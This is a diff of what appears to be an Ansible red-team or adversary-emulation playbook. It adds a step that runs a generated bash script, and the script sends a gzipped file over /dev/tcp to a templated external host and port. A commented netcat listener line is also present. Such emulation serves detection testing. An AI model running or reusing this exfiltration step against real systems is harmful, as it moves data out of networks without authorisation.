@@ -27,9 +27,11 @@
         format: gz
       when: exfil_check.stat.exists
     - name: Exfiltration Over Alternative Protocol TCP
+    # bin/bash required to use /dev/tcp
       shell: |
         echo '#!/bin/bash' > /tmp/exfil-tcp.sh
         echo 'cat /tmp/{{ exfiltration_file }}.gz > /dev/tcp/{{ exfil_fqdn }}/{{ exfil_port }}' >> /tmp/exfil-tcp.sh
+        bash /tmp/exfil-tcp.sh
       # netcat -lvp > {{ exfiltration_file }}-tcp.gz
       when: exfil_check.stat.exists
     - name: Exfiltration Over Alternative Protocol UDP
